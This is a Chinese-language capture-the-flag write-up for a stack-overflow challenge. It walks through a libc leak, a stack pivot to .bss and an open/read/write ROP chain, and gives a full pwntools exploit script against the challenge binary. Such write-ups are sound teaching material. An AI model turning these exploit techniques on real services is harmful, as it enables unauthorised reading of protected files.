# Elden Ring Ⅰ

## 题目简述

程序存在栈溢出，但最终目标不是直接执行 `/bin/sh`，而是读取受限环境中的 flag 文件。官方解法先用 ROP 泄露 libc，再把栈迁移到 `.bss`，最后构造 `open`、`read`、`write` 调用链读取 `flag`。题目名只是剧情化命名，与漏洞机制无关。

## 解题过程

### 泄露 libc

返回地址前有 `0x108` 字节填充空间。第一阶段调用 `puts(puts@got)`，随后返回漏洞函数重新输入。泄露出的 `puts` 地址减去符号偏移即可确定 libc 基址。

### 将后续 ROP 链迁移到 `.bss`

栈上可用空间不足以稳定容纳完整 ORW 链，因此第二次输入把保存的 `rbp` 改为 `.bss - 8`，再利用程序内 `0x401282` 附近的读入/迁移片段，把下一阶段数据放到 `.bss` 并切换栈指针。

### 构造 ORW

最终链条依次执行：

1. `open("flag", 0)` 打开 flag 文件；
2. 假定新文件描述符为 3，执行 `read(3, 0x404140, 0x100)`；
3. 执行 `write(1, 0x404140, 0x100)` 把内容写到标准输出。

官方脚本按如下方式组织。PDF 中跨页后缺失的 `payload +=` 前缀已依据同一条 ROP 链的连续语义恢复：

```python
from time import sleep

from pwn import ELF, context, p64, remote, u64

context(log_level="debug", arch="amd64", os="linux")

HOST = "challenge.host"
PORT = 9999

io = remote(HOST, PORT)
elf = ELF("./vuln")
libc = ELF("./libc.so.6")

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
vuln_addr = 0x40125B
pop_rdi_ret = 0x4013E3
bss_addr = 0x404090

# 第一阶段：泄露 puts 并回到漏洞函数。
stage1 = b"A" * 0x108
stage1 += p64(pop_rdi_ret)
stage1 += p64(puts_got)
stage1 += p64(puts_plt)
stage1 += p64(vuln_addr)
stage1 = stage1.ljust(0x130, b"\x00")
io.sendafter(b"accord.", stage1)

io.recv()
puts_addr = u64(io.recv(6).ljust(8, b"\x00"))
libc.address = puts_addr - libc.sym["puts"]

pop_rax_ret = libc.address + 0x36174
pop_rsi_ret = libc.address + 0x2601F
pop_rdx_r12_ret = libc.address + 0x119211
open_addr = libc.sym["open"]
read_addr = libc.sym["read"]
write_addr = libc.sym["write"]

# 第二阶段：设置新的 rbp，并进入程序内的读入/栈迁移片段。
stage2 = b"a" * 0x100
stage2 += p64(bss_addr - 8)
stage2 += p64(pop_rax_ret)
stage2 += p64(bss_addr)
stage2 += p64(0x401282)
stage2 += p64(0) * 2
io.sendafter(b"accord.", stage2)
sleep(0.01)

# 第三阶段：open -> read -> write。
orw = p64(pop_rdi_ret)
orw += p64(0x404138)  # "flag\0"
orw += p64(pop_rsi_ret)
orw += p64(0)
orw += p64(open_addr)

orw += p64(pop_rdi_ret)
orw += p64(3)
orw += p64(pop_rsi_ret)
orw += p64(0x404140)
orw += p64(pop_rdx_r12_ret)
orw += p64(0x100)
orw += p64(0)
orw += p64(read_addr)

orw += p64(pop_rdi_ret)
orw += p64(1)
orw += p64(pop_rsi_ret)
orw += p64(0x404140)
orw += p64(pop_rdx_r12_ret)
orw += p64(0x100)
orw += p64(0)
orw += p64(write_addr)

orw += b"flag\x00\x00\x00\x00"
orw += p64(0) * 16
io.send(orw)
io.interactive()
```

脚本中的固定 gadget 和 `.bss` 地址只适用于官方题目二进制。验证时首先检查泄露出的 libc 基址是否页对齐；如果 `open` 后返回的描述符不是 3，应根据进程已打开的描述符数量调整第一项 `read` 参数。

## 方法总结

- 核心技巧：两阶段信息泄露、栈迁移和 ORW ROP。
- 识别信号：存在栈溢出但不能直接拿 shell，且栈空间不足、二进制中有可写 `.bss` 与重新读入数据的代码片段。
- 复用要点：迁移前要同时控制新 `rbp` 和后续控制流；ORW 中的文件描述符 3 只是常见假设，必要时应改用 `open` 返回值传递或现场验证。
